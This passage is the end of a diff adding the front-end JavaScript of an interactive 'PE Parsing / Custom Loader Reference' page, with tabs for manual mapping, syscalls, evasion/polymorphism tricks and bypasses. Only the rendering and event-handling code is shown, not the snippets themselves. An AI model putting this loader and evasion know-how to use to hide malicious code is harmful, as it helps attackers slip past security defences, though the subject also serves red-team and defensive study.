+  codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+
+var thtml=tricks.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No evasion tricks.</div>':
+  '<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">EVASION / POLYMORPHISM TRICKS</div>'+
+  tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>PE Parsing / Custom Loader Reference</h1><div class="sub">PEB \u2022 PE \u2022 Exports \u2022 Hashing \u2022 IAT \u2022 Relocs \u2022 Mapping \u2022 Syscalls \u2022 Toolkit \u2022 Bypasses</div></div><div class="at"><button class="ab'+(S.a==='x64'?' on':'')+'" data-ar="x64">x64</button><button class="ab'+(S.a==='x86'?' on':'')+'" data-ar="x86">x86</button></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Evasion'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(S.a,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#60a5fa",l:"PEB"},{c:"#4ade80",l:"PE"},{c:"#f59e0b",l:"Exports"},{c:"#a78bfa",l:"Hash"},{c:"#f87171",l:"Imports"},{c:"#eab308",l:"Relocs"},{c:"#34d399",l:"Syscalls"},{c:"#ef4444",l:"Evasion"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+
+// Events
+$$('[data-ar]').forEach(function(b){b.onclick=function(){S.a=b.dataset.ar;render()}});
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+
+$$('.cp').forEach(function(p){
+  p.querySelector('.ct2').onclick=function(){
+    var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+    if(ex){ex.remove();cv.classList.remove('op');return}
+    cv.classList.add('op');
+    var ci=parseInt(p.dataset.ci),c=codes[ci];
+    var pre=document.createElement('pre');
+    pre.className='cb mono';
+    pre.innerHTML=c.c.split('\n').map(function(line){
+      var ci2=line.indexOf('//'),si2=(c.l==='asm'?line.indexOf(';'):-1);
+      var cs=ci2>=0?ci2:(si2>=0?si2:-1);
+      if(cs>=0)return esc(line.slice(0,cs))+'<span class="cm">'+esc(line.slice(cs))+'</span>';
+      if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
+      return esc(line);
+    }).join('\n');
+    p.appendChild(pre);
+  };
+});
+
+$$('.ti').forEach(function(p){
+  p.querySelector('.tt').onclick=function(){
+    var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+    if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+    p.classList.add('op');cv.classList.add('op');
+    var ti=parseInt(p.dataset.ti);
+    var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+    p.appendChild(div);
+  };
+});
+
+// Mapping steps
+if(S.s==='map'&&S.t==='flow'){
+  var sr=$('#sr'),sd=$('#sd');
+  function rms(){
+    sr.innerHTML=MS.map(function(s,i){
+      return'<div class="sn'+(i===S.ms?' on':'')+'" data-ms="'+i+'" style="border-color:'+(i===S.ms?s.c:'#1a1d27')+';color:'+s.c+'"><div style="font-size:.55em;font-weight:800;color:'+(i===S.ms?s.c:'#374151')+'">STEP '+s.n+'</div><div style="font-size:.72em;font-weight:600;color:'+(i===S.ms?'#e5e7eb':'#6b7280')+'">'+s.l+'</div><div style="font-size:.58em;color:#4b5563">'+s.s+'</div></div>'+(i<MS.length-1?A():'')
+    }).join('');
+    var ms=MS[S.ms];
+    sd.innerHTML='<div style="display:flex;gap:6px;align-items:center;margin-bottom:4px">'+T("STEP "+ms.n,ms.c)+' <span style="font-weight:700;font-size:.82em">'+ms.l+'</span></div><div style="color:#d1d5db;font-size:.78em;line-height:1.5">'+ms.d+'</div>';
+    sd.style.borderColor=ms.c+'30';
+    $$('[data-ms]',sr).forEach(function(b){b.onclick=function(){S.ms=parseInt(b.dataset.ms);rms()}});
+  }
+  rms();
+}
+}
+render();
+</script>
+</body>
+</html>
